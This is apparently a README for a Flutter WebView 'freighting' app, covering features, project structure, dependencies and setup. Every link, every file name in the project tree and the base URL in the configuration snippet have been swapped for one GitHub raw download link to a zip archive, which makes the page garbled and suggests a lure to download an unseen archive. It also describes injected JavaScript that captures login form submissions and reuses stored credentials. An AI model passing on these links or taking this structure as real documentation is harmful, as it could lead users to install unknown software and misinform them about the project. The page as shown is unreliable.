# Freighting WebView App

A Flutter application that wraps the web interface of [https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip](https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip) in a native mobile app using WebView technology.

## Features

- **Seamless WebView Integration**: Smooth loading of web content with progress indication
- **Persistent Sessions**: Auto-login and cookie management for seamless user experience
- **Offline Support**: Graceful handling of connectivity issues with clear user feedback
- **File Handling**: Download and open files (PDFs, documents, etc.) through the app
- **External URL Management**: Open YouTube and other media in appropriate native apps
- **Pull-to-Refresh**: Native pull-to-refresh support for reloading content
- **Error Handling**: Graceful error recovery and user-friendly error messages

## Project Structure

```
lib/
├── https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip                          # App entry point
├── browser_module/
│   ├── https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip     # Refresh handling logic for browser
│   ├── https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip            # Web browser screen UI
│   └── https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip  # YouTube embed management
├── file_manager/
│   └── https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip             # File operations (open/save/etc.)
├── network/
│   └── https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip    # Internet connectivity status logic
├── offline_support/
│   └── https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip        # Dialog UI for offline situations
├── session/
│   └── https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip           # Session and local storage logic

```

## Implementation Details

### WebView Setup

The core WebView implementation uses `flutter_inappwebview` with optimized settings for performance and user experience. Key features include:

- **Progress Indicator**: Shows loading progress for better UX
- **Cookies Management**: Persists login sessions across app launches
- **Error Handling**: Gracefully handles page errors
- **Back Button Navigation**: Proper back navigation handling

### Session Management

The app maintains user sessions for seamless experience:

- **Cookie Persistence**: Saves and restores cookies between sessions
- **Auto Login**: Automatically fills login credentials if session expires
- **Account Switching**: Properly handles user-initiated account changes

### Connectivity Handling

Robust offline support with:

- **Real-time Monitoring**: Detects network changes
- **Offline UI**: Shows user-friendly message when offline
- **Auto Recovery**: Automatically resumes when connection is restored

### File Handling

Proper handling of various file types:

- **PDF Handling**: Opens PDFs in external viewers
- **File Downloads**: Downloads files when direct opening isn't possible
- **File Types**: Handles various document types (PDFs, Office docs, etc.)

## Dependencies

```yamldependencies:
  flutter:
    sdk: flutter

  # Web & URL Handling
  flutter_inappwebview: ^6.1.5       # Advanced WebView implementation
  url_launcher: ^6.3.1               # Launch URLs in browser or apps

  # Connectivity & Network
  connectivity_plus: ^4.0.1          # Check internet/network status
  http: ^0.13.6                      # Perform HTTP requests

  # Storage & Preferences
  shared_preferences: ^2.5.2         # Local key-value storage for sessions
  path_provider: ^2.1.2              # Access system file paths

  # File Management
  file_picker: ^9.2.1                # Pick files from storage
  open_filex: ^4.3.2                 # Open files using native apps

  # Permissions
  permission_handler: ^11.0.1        # Handle runtime permissions

  # UI Enhancements
  flutter_launcher_icons: ^0.14.3    # Custom launcher icons
  flutter_native_splash: ^2.4.4      # Native splash screen

  # Linting
  flutter_lints: ^5.0.0              # Recommended lint rules

```

## Setup Instructions

1. Clone the repository
2. Run `flutter pub get` to install dependencies
3. Ensure you have the proper permissions in your app's manifest:
    - Internet access
    - Storage access (for file downloads)
    - Camera/microphone (if needed for web features)
4. Run the app using `flutter run`

## Configuration

You can modify the base URL in `https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip`:

```dart
const String _baseUrl = "https://github.com/LabbaiIrfan/freighting_software/raw/refs/heads/main/linux/runner/software_freighting_1.3.zip";
```

## Advanced Features

### Custom JavaScript Injection

The app injects JavaScript to enhance web functionality:

- **Account Switch Detection**: Detects when user switches accounts
- **Form Submission Capture**: For login credential management
- **Error Detection**: Enhanced error handling

### Error Recovery

Implements several error recovery mechanisms:

- **Auto Reload**: Reloads on connectivity restoration
- **Credential Recovery**: Falls back to stored credentials if session fails
- **Error UI**: Clear error messages with retry options